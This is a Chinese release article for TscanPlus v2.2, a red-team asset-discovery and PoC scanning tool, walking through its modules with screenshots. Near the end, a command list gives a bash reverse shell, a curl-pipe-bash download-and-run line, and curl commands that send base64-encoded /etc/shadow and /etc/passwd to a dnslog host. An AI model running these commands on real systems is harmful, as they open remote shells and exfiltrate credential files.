#  无影(TscanPlus) v2.2发布：1300+内置Poc   
原创 重剑无锋  Tide安全团队   2024-07-22 11:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png "")  
  
声明：Tide安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png "")  
  
  
  
**【无影(TscanPlus) v2.2新增key认证功能，转发本文章到朋友圈，获赞30个以上，截图发到"Tide安全团队"公众号后台，可获取一个key，解锁所有POC功能。】**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO6fvSbC8libRWFfcnV30QomKHblp3zwz7mnibkGLibU4Vaia1vaa1Zb3HwQ/640?wx_fmt=png&from=appmsg "")  
  
****  
无影(TscanPlus)，一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。  
  
**【主要功能】** 端口探测、服务识别、URL指纹识别、POC验证、弱口令猜解、目录扫描、域名探测、网络空探等。  
  
**【辅助功能】** 编码解码、加密解密、CS上线、反弹shell、杀软查询、提权辅助、常用命令、字典生成等。  
  
**TscanPlus 功能介绍可参考文章：《TscanPlus——一款红队自动化工具》**https://mp.weixin.qq.com/s/G_ErhJZqvS9h-XHKeAcy3A  
  
**【特色功能】**  
  
1、内置5.2W余条指纹数据，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。  
  
2、在指纹探测结果中，对130多个红队常见CMS和框架、Poc可关联CMS进行了自动标注。内置大量高质量Poc，并可外接Nuclei、Afrog、Xray等Poc工具，可实现指纹和Poc的联动，根据指纹识别的结果自动关联Poc，并可直接查看poc数据包相关信息。  
  
3、在创建IP端口扫描、Url扫描时，可关联Poc检测、密码破解、目录扫描等功能，发现匹配的服务或产品时会自动触发密码破解或poc检测。  
  
4、内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。  
  
5、实现了编码解码、哈希计算、加密解密、国密算法、数据格式化、其他转换等共36种类型，其中编码解码类8种、哈希计算13种、加密解密9种、国密算法3种、数据格式化9种、其他2种。  
  
6、目录枚举默认使用HEAD方式，可对并发、超时、过滤、字典等进行自定义，内置了DirSearch的字典，可导入自己的字典文件，也可用内置字典fuzz工具进行生成。  
  
7、内置各类反弹shell命令85条、Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。  
  
8、灵活的代理设置，可一键设置全局代理，也可以各模块单独开启代理功能，支持HTTP(S)/SOCKS5两种代理，支持身份认证。  
  
9、快速的子域名探测，域名可联动其他子功能，可配置key后对接多个网络空间探测平台，一键查询去重。  
  
10、内置资产分拣、JsFinder、Host碰撞、Jwt秘钥破解、IP查询、Windows提权辅助、杀软查询、shiro解密等各类工具。  
### 更新日志  
  
无影(TscanPlus) v2.2正式版发布，感谢各位师傅提出的宝贵修改建议和诸多bug！  
  
主要更新：  
  
1、新增4项新功能：Host碰撞、40xBypass检测、Jwt破解和加解密、IP归属地查询。  
  
2、为使"无影"Poc检测能形成良性生态，增加Key认证功能(可解锁所有Poc)。  
  
3、支持自定义被动指纹和主动指纹添加，并增加指纹策略，可根据不同需求和电脑配置选择不同指纹库。  
  
4、各功能模块支持断点重扫功能，当扫描中断、点Stop停止或程序闪退、卡死等情况，可恢复之前的扫描。  
  
5、增加配置文件自动备份、hunter自定义API、红队内置命令可编辑等。  
  
6、修复目录扫描闪退、Telnet蜜罐误报、端口策略、主动指纹误报、WMI/RDP密码破解误报、标题乱码显示等诸多Bug。  
  
在此也感谢各位师傅（来自Github、知识星球、工具交流群等）提出的宝贵修改建议和诸多bug！所有提过bug或建议的小伙伴会被拉入工具交流群，并享受新版本新功能第一时间尝鲜及永久VIP服务！  
### 1、软件使用  
  
Github下载：https://github.com/TideSec/Tscanplus  
  
软件基于Wails开发，可支持Windows/Mac/Linux等系统，下载即可使用。  
### 2、新功能介绍  
#### 2.1 新增Key认证功能  
  
为了"无影(TscanPlus)"的Poc检测更全面、精准，能形成良性生态，新增key认证功能，经过key认证后，可使用所有内置POC，未认证用户只能使用420个POC，其他功能均可正常使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOLXThjBmlr0LVxaExaej7POw2zIKia0es5KsOgDLOnPoibF0MIK0l18Bw/640?wx_fmt=png&from=appmsg "")  
  
通过key认证后，可使用所有内置的1300个poc。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEONINYxwcibkran0Sm5Kk3bwcictoiaGEWAO6ObEAV1tZiafdiaUrNYo4oKwg/640?wx_fmt=png&from=appmsg "")  
  
**获取Key的四条途径:**  
  
1、在Poc平台提交3个Poc后可获得3个Key，之后每多提交一个Poc可多获得一个Key。  
  
2、在交流群或Github Issue中提交一个有效Bug，Bug修复后可获得一个Key。  
  
3、加入星球可直接获得3个Key，之后每提交一个Poc可多获得一个Key。  
  
**4、转发本文章到朋友圈，获赞30个以上，截图发到"Tide安全团队"公众号，可获得一个key，解锁所有poc功能。**  
  
**详细Key提交、获取和使用说明可看这里：http://poc.tidesec.com/index/explain.html**  
#### 2.2 新增Host碰撞功能  
  
Host碰撞通过修改Host字段来发送数据包，该功能可对 IP和域名碰撞匹配，访问到绑定host才能访问的系统。因为现在越来越多的业 务是通过nginx等负载进行反向代理访问，可能有些内网域名和外网域名使用相同的 负载均衡进行反代，这样就可能通过修改host字段实现访问内网系统。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOSicXKYKu2ByrJxr2o4fx8gDicq0110B0HvsOyGAYyFicHuoeNktbZEj5w/640?wx_fmt=png&from=appmsg "")  
  
2.3 新增40xBypass检测功能  
  
做渗透测试时常会碰到40x的资产，而有一些40x的页面是可以绕过的，比如不同的HTTP方法、Referer绕过、代理IP、HTTP Header修改、替换大小写等。40xBypass检测功能集成了8种常见bypass方式，并可在config/4xxBypass目录下修改字典文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOap5zCYiaG2XadAHnhwMia1VfwzsVT9pejSSyGbgehicqibOLjycXsaic0aw/640?wx_fmt=png&from=appmsg "")  
  
2.4 新增Jwt破解和加解密功能  
  
可对jwt进行加解码和秘钥破解，支持HS256、HS384、HS512、RS256、RS384、RS512、ES256、EDDSA等多种算法。内置秘钥字典10W+，两秒可完成，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOXlIWyoia5OpaVGhaBUehyC11yOWftB774mTHtibPm0ibnPdciajzEXHwRg/640?wx_fmt=png&from=appmsg "")  
  
2.5 新增IP归属地查询  
  
针对ip地址、子域名等资产可自动提取，并查询物理地址。并在ip扫描、url探测、子域名枚举时，增加ip查询功能。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOJRQYQZR0TEUgicKepzzy7ibjCNtg4tVSAIsT4cya36OquSDUC0bdOInw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOBMLdJD5HRnDiahlSCeaX1XANicmLw6VzlWQjK3A7ts4OuAXjOJ1jiaU6w/640?wx_fmt=png&from=appmsg "")  
  
3、其他已有功能  
#### 1、Welcome  
  
软件运行后，需审慎阅读、充分理解**《免责声明&使用许可》**内容，并在Welcome页面勾选**“我同意所有条款”**，之后方可使用本软件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOKEjTugqdAvLflvkh5DTWdU6wwwUZBm38DXu69C44RSicK0adIDB593Q/640?wx_fmt=png&from=appmsg "")  
  
2、项目管理  
  
项目管理功能是把各分散功能进行流程整合，用户可根据自己的使用场景设计项目功能，完美融合了"资产测绘"、"子域名枚举"、"IP端口扫描"、"密码破解"、"POC检测"、"URL扫描"、"目录探测"、"UrlFinder"等功能。项目执行结果会存储到相应项目数据库中，方便后续查询和使用。  
  
**【任务配置】**  
  
在添加目标资产并配置任务参数后，TscanPlus会在后台对相应目标执行相应操作，并显示在对应功能Tab栏中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOAdG3l4iayS2pb2a4QWWstVG3mPe3wxqyDJlutwyrk6qcccfNa3NvCSg/640?wx_fmt=png&from=appmsg "")  
  
**【项目管理】**  
  
在项目管理中，还可直观的展示项目概览，如项目总数、URL资产、IP资产、漏洞总数、敏感信息等，并可对所有项目进行编辑、重新执行、停止、删除等操作。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEORbWn0b4LkKeAibP33OCByxLHns2VMvDdmrYqgZ4XOIRuLjmmmtJQQwg/640?wx_fmt=png&from=appmsg "")  
  
**【结果展示】**  
  
所有扫描结果将显示在对应功能Tab中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOcXZ42dfQxNPjoHL0uCjHzsiboVFgxRURyicAd2zQGa2rA0Y2KKjbBVNQ/640?wx_fmt=png&from=appmsg "")  
  
3、端口扫描  
  
对目标IP进行存活探测、端口开放探测、端口服务识别、Banner识别等，可识别100余种服务和协议。  
  
**【任务配置】**  
  
IP支持换行分割，支持如下格式：192.168.1.1、192.168.1.1/24、192.168.1.1-255、192.168.1.1,192.168.1.3
排除IP可在可支持输入的IP格式前加!：!192.168.1.1/26  
  
可选择端口策略、是否启用Ping扫描、是否同步密码破解、是否同步POC检测、是否开启代理，配置任务后可开启扫描。  
  
**【扫描结果】**  
  
扫描结果如下，会显示服务相关协议、Banner、状态码、标题等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。  
  
选择某一行，右键菜单也可对某地址进行单独POC测试、弱口令测试、目录枚举等，也可以对数据进行单条保存或全部保存。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO3QG95CZX2ISLxQM2ibFiaNv0aDZfytEYMskRfQcVtQ6MMW306YptxE0w/640?wx_fmt=png&from=appmsg "")  
  
**【功能联动】**  
  
在任意功能中，都可与其他功能进行联动，比如IP扫描时可同时开启密码破解和POC检测，一旦发现匹配的端口服务会自动进行密码破解，发现匹配的指纹时会进行poc检测。勾选这两项即可，结果会显示在相关模块中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO06vrNLyNdYSf8u28kSNlMm6DxYRSrLxzwSEn77ibX7aGicmfm8kANib1A/640?wx_fmt=png&from=appmsg "")  
  
**【高级配置】**  
  
在高级配置中可设置代理地址，在开启全局代理后，各功能都会代理，支持HTTP(S)/SOCKS5两种代理，支持身份认证。还可以设置全局cookie或UA等。  
  
代理格式：  
  
HTTP代理格式：http://10.10.10.10:8081  或 http://user:pass@10.10.10.10:8081  
  
HTTPS代理格式：https://10.10.10.10:8081  或 https://user:pass@10.10.10.10:8081  
  
Socks5代理格式：socks5://10.10.10.10:8081  或 socks5://user:pass@10.10.10.10:8081  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOwjKcnIhQwxqfWDRHx6tTdLs5aXX2MKo5s2pG9A7EBP9ibtbXfXIK5dw/640?wx_fmt=png&from=appmsg "")  
  
4、URL探测  
  
TscanPlus目前整合指纹2.6W余条，经多次优化，有效提高了资产发现的协程并发效率，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。  
  
**【任务配置】**  
  
URL探测主要针对web地址进行批量检测，输入格式为Url地址每行一个，并且前缀为http/https：http://www.abc.com
http://192.168.1.1:8080
https://www.abc.com:8443  
  
同样，可选择线程数、是否同步POC检测、是否开启代理，配置任务后可开启扫描。  
  
**【扫描结果】**  
  
扫描结果如下，会显示web站点标题、Banner、状态码、中间件、WAF识别等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。  
  
选择某一行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOF6l8ibFyUuuTyv2zcvYtAqhCTibTF1xZeP0QF4MDfhTnEubvgRlBXhww/640?wx_fmt=png&from=appmsg "")  
  
5、域名枚举  
  
在域名枚举方面TscanPlus集成了多种功能，可以使用字典枚举，也可以使用多个免费接口进行查询。还可以对枚举到的域名进行联动的端口开放测试、指纹识别及poc检测、目录枚举等。  
  
**【任务配置】**  
  
枚举较依赖网络，所以多域名时会逐个进行。默认10000的字典，线程50在网络状态较好时大约用时12秒。  
  
域名每行一个，不要加http前缀，如:  
  
tidesec.com
tidesec.com.cn  
  
同样，可选择线程数（建议50-00）、是否同步POC检测、是否指纹识别，配置任务后可开启域名任务。  
  
**【扫描结果】**  
  
扫描结果如下，会显示子域名、解析IP、开放端口、网站标题、域名来源等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。  
  
选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEObbJyO1Kv0T0SFib1DicDBSrT3UEWDOAiaz0SMWzu85F0vyIicncH7NXcbQ/640?wx_fmt=png&from=appmsg "")  
  
6、POC检测  
  
TscanPlus内置了部分POC，并进行了Level分类，Level1是最常见、使用频率最高的POC，Level2是较通用的POC，Level3为不太常见POC。  
  
**【任务配置】**  
  
URL可导入txt文件，也可自行输入，必须是HTTP/HTTPS为前缀的URL地址。  
  
比较重要的一个选项是“POC匹配指纹”，默认开启这个选项，这时会根据指纹信息匹配POC，如匹配不到POC则不检测。关闭该选项后，会对所有选择的POC进行测试。  
  
POC选项可指定外部POC文件或POC文件夹，在后面输入POC的绝对路径，如C:\POC，但导入的POC无法和指纹进行匹配，默认会把导入的POC全跑一遍。  
  
外部POC可支持Xray或Xray或同样格式的POC，POC编写可参考：https://poc.xray.cool/ 或 https://phith0n.github.io/xray-poc-generation/  
  
**【扫描结果】**  
  
扫描结果如下，会显示发现漏洞的站点、POC名称、Banner、状态码、标题等，选择某一行后，可查看Request和Response数据包。  
  
最下方会显示目标存活数量、检测成功POC数量、检测队列情况、用时等。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOx7YuqJCxTWDF7MLygdR1ABd88FHnRZ17E7Wg4PgyMP8QsNUBX5E1fw/640?wx_fmt=png&from=appmsg "")  
  
7、密码破解  
  
TscanPlus内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。  
  
**【任务配置】**  
  
在左侧选定要破解的服务，并填入目标地址即可。右侧配置任务时，可选择使用内置字典或自行导入、是否开启指纹识别、Oracle监听设置、执行命令等。  
  
**【扫描结果】**  
  
扫描结果如下，会显示发现弱口令的服务、账号、密码、Banner、执行命令、用时等。  
  
最下方会显示目标存活数量、破解成功数量、检测队列情况、用时等，并会实时显示破解日志。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOR16puSSz06vQF0mUlrstrJUwFBTOf9W1UEr47ibuqiaiaYpLpQ9FV5ViaQ/640?wx_fmt=png&from=appmsg "")  
  
8、空间测绘  
  
为使信息搜集更快捷方便，TscanPlus集成了多个网络空间测绘接口，包括fofa,hunter,quake,shodan,censys,zoomeye,threatbook,binaryedge,virustotal等9个主流空探API，可根据域名、IP地址、端口、应用、服务等进行检索，并对各网络空探结果进行去重整合。  
  
**【任务配置】**  
  
首先要配置key信息，如没有key可点击后面"API申请"进行申请，之后点击启用即可使用该API接口。  
  
针对Fofa还提供了自定义API接口功能，可自行设定FofaAPI地址。  
  
在主界面选择字段，如域名、IP地址、端口、应用、服务等进行检索，并输入检索条件即可。TscanPlus会对所有结果进行去重和整合。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOByibsr6svphyo1Ir6uicFR5bYU8KYIhlfmUc6JyLC4siaKqKZNZMWoic2A/640?wx_fmt=png&from=appmsg "")  
  
**【查询结果】**  
  
查询结果如下，会显示URL、IP、域名、端口、协议、标题、指纹、应用、Whois、备案、ISP、OS、地区、更新时间、API来源等信息。  
  
选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举、端口扫描等，也可以对数据进行单条保存或全部保存。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOkOuIWPG9QiaabmPR9roDib4R1X1CfR8ohYvNO3tMmTbHmaHqe5OicQq6g/640?wx_fmt=png&from=appmsg "")  
  
9、编码解码  
  
编解码功能模块实现了编码解码、哈希计算、加密解密、国密算法、数据格式化、其他转换等共36种类型，其中编码解码类8种、哈希计算13种、加密解密9种、国密算法3种、数据格式化9种、其他2种。  
  
**【任务配置】**  
  
1、只需在"编码解码"功能页面的左侧栏目中点选对应的编码项，即可添加到右侧Tab中。  
  
2、每个Tab支持多个编码叠加，并支持编码的排序，上一个编码的输出会作为下一个编码的输入。  
  
3、每种编码都可以选择是否启用、加密或解密，对每个编码可进行输入和输出格式进行设置，支持RAW、Hex、base64等常见格式。  
  
4、无影支持多Tab切换，可以根据需求设置多组Tab，以对结果进行对比。  
  
5、可记住本次编码配置，下次再运行软件，可直接使用上一次的配置。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOjb63FmZ4XjrKrGbEFGjN3cgRdSkjfNAibnS8ZFicb9kmCt5jYR56NKOA/640?wx_fmt=png&from=appmsg "")  
  
  
**【输出结果】**  
  
**1、编码解码**：Base64、Base32、URL编解码、ASCII、各进制转换、字符串与进制转换、HTML编解码、Unicode编解码、一键编解码等  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO1A4HPibJDlBvCCZvbfwsEqrFqVZa844RaOzlKroWiagqBdqmy3VD4ib8w/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180132022  
  
一键编解码可实现对输入的字符，进行所有的编码解码并输出结果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOcHMe9cWaIia4ExZwJ6E23dYicibwAGhJuK3LkDvUzlUVfedvRdb5aHHEw/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180214330  
  
**2、哈希计算**：MD5、HmacMD5、SM3、HmacSM3、SHA1、HmacSHA1、SHA2-224、SHA2-256、SHA2-384、SHA2-512、HmacSHA2、SHA3-224、SHA3-256、SHA3-384、SHA3-512、HmacSHA3、NTLM、HmacNTLM、一键哈希等。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOiakgW1iaKyPHKuonicYFoCp7SqWggroU5SJEwnibCFicvGy0QkJDkqceeJA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180257634  
  
一键哈希可实现对输入的字符，进行所有的哈希计算并输出结果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO2YJgia3icbnwYxgIvNrias1pictyAiad3P1f4mfP2negLWBELvwuGZhcQuA/640?wx_fmt=png&from=appmsg "")  
  
**3、加密解密**：AES加解密、RSA加解密、SM2加解密、SM4加解密、DES加解密、3DES加解密、Xor加解密、RC4加解密、Rabbit加解密、自动生成RSA秘钥、自动生成SM2秘钥等  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOYgfN5rvh7G3WbzbpUWeoKjCurLEzBs477PeMFuL3Zu2tquQaaYV2GA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180635476  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOI6dCH3z1hTao76waBr6nD38Y2vYz0rOxbnfos0viaIxj8kNANk3V1SQ/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180748714  
  
**4、国密算法**：SM2椭圆曲线非对称加密算法、SM4分组对称密码算法、SM3密码杂凑算法、并支持自动生成SM2秘钥。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOhicYQQzKvutk0pxXj81torNHnE2lwB8YhiaticPbR2VaR5nQQaEukIoJA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617180836752  
  
**5、数据格式化**：JSON格式化与压缩、XML格式化与压缩、IP地址与整数互转、String.fromCharCode、Unix时间戳互转、文本去除重复行、字母大小写、生成各类随机字符串、字符串反转  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOWA0rj7ibomLjRibibiaFf6dYgjEfXomxOR9JQdSCFYNklRDgXCCiadH5iaWA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617181019264  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOoSniasNT1KRgMLYfn8wXSricM114cpRggG27Zl8GJ1h6x8sdMkZrQfJA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617181053649  
  
**6、其他**：JWT解析与弱密码、一键解密所有OA  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO7272QEDN1DXI0lwsSmWHDsdF3bHEM7IIUiaYicYnZnjWfmthSBa9s5uA/640?wx_fmt=png&from=appmsg "")  
  
image-20240617181132609  
#### 10、目录扫描  
  
目录扫描主要是对web站点进行目录枚举，支持字典模式、Fuzz模式、存活探测等，支持HEAD/GET方法，默认使用HEAD方法。  
  
**【任务配置】**  
  
字典默认使用dirsearch内置字典，大约9000条数据，扩展支持asp、aspx、jsp、php、py等格式，TideFuzz开启后会根据枚举结果进行递归Fuzz。  
  
如果使用Fuzz模式，需输入fuzz元字符，之后会根据fuzz长度生成字典，但注意fuzz字典不能过大，当字典超过10万行时会提示字典过大，无法扫描。  
  
还可以配置超时时间、超时重试次数、间隔时间、URL并发数、目录线程数等，并可以对扩展名、状态码进行过滤。  
  
**【扫描结果】**  
  
扫描结果如下，会显示发现的URL地址、状态码、Body长度等，选择某一行后，可查看Request和Response数据包。  
  
最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。  
  
1、增加了递归扫描的功能，开启该选项后，发现新的目录时，会对该目录再进行目录枚举；  
  
2、对返回同样长度、同样状态码的页面，出现5次以上不再显示  
  
3、增加关键字过滤、返回长度过滤、自定义后缀等功能。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOV98mlQVzDauUPABm5TcuKSyo92OxHenWZSvZTeia9icP5eKMDrqp01vw/640?wx_fmt=png&from=appmsg "")  
  
11、UrlFinder  
  
URLFinder功能可对目标信息进行快速、全面的提取，可用于分析页面中的js与url，查找隐藏在其中的敏感信息或未授权api接口。  
  
**【任务配置】**  
  
输入目标地址后，可进行模式选择，"普通模式"默认对单层链接进行抓取，"深入模式"会对链接进行三层抓取，耗时相对长一些。  
  
探测层数可设置探测的链接层数，上限数量是对URL总数进行限制，防止无限制爬取。  
  
"仅显示本站"是对URL和JS结果进行过滤，此外还可以配置线程数，并可以对扩展名、状态码、关键词进行过滤。  
  
**【扫描结果】**  
  
扫描结果如下，会显示发现的URL地址、状态码、Body长度等，当发现敏感信息时，会在"标题||敏感信息"列中显示。  
  
最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。  
  
1、对返回同样长度、同样状态码的页面，出现5次以上不再显示  
  
2、增加关键字过滤、返回长度过滤、自定义后缀等功能。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOggFEq3EBibvSjA7ArQcJ9AKIxxKPy88l4Carng7yOmVHBFjSdOoPI7g/640?wx_fmt=png&from=appmsg "")  
  
12、上线反弹  
  
TscanPlus内置各类反弹shell命令85条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。  
##### 【反弹shell】  
  
可设置IP/PORT、listener类型、shell类型、是否编码，选择你想要的命令后，即可生成响应代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOalK4Hz9cmic6W9NcibfP53x8W7kUaGv5yAYzsrr06djF37ODvXlPxIaA/640?wx_fmt=png&from=appmsg "")  
  
**【CS上线】**  
  
CS上线配置CS Payload地址后，即可生成相应代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOPZlQXqr9LGbH7Tu53CupsibxYAAckbIuBOvvVicN5fuRg9MnQF4XWjHw/640?wx_fmt=png&from=appmsg "")  
  
13、红队命令  
  
TscanPlus内置常用红队命令，包括Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条。  
##### 【红队命令】  
  
Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOBFqJqZwVmYT3UFicWbiaA4ic8yvGWbUCJJgjXgKAIpe7p4EPBeyMr6f8Q/640?wx_fmt=png&from=appmsg "")  
  
**【下载命令】**  
  
内置常见下载命令31条，基本能覆盖内网渗透能用到的下载方法。  
  
配置URL地址和目标文件名后，可自动生成相应代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOQEiaicEuJFzrBKawuniaDslxuuKiaR5xun2pTcUPx56Z7w8VibFbM4pJiaicg/640?wx_fmt=png&from=appmsg "")  
  
**【java编码】**  
  
有时，通过 Runtime.getRuntime().exec() 执行命令有效负载会导致失败。使用 WebShell，反序列化利用或通过其他媒介时，可能会发生这种情况。  
  
有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，ls > dir_listing在shell中执行应该将当前目录的列表输出到名为的文件中dir_listing。但是在exec()函数的上下文中，该命令将被解释为获取>和dir_listing目录的列表。  
  
其他时候，其中包含空格的参数会被StringTokenizer类破坏，该类将空格分割为命令字符串。那样的东西ls "My Directory"会被解释为ls '"My' 'Directory"'。  
  
在Base64编码的帮助下，java命令编码转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell再次使管道和重定向更好，并且还确保参数中没有空格。  
  
常用命令清单  
```
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
ping `whoami`.key.dnslog.cn
curl http://www.google.com/bash.txt|bash
curl http://key.dnslog.cn/?r=`whoami`
curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`
curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')
curl http://www.google.com/key.txt
curl http://www.google.com/key.txt -O
curl http://www.google.com/key.txt -o key.txt

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOcXteP48ic60n4YtibZSHb3U1ceWicbeXl3EEj0WfibhG6AVEeIPIOfzdYQ/640?wx_fmt=png&from=appmsg "")  
  
14、辅助工具  
  
TscanPlus内置Windows提权辅助、杀软查询、字典生成等工具，后续会持续更新。  
##### 【资产分拣】  
  
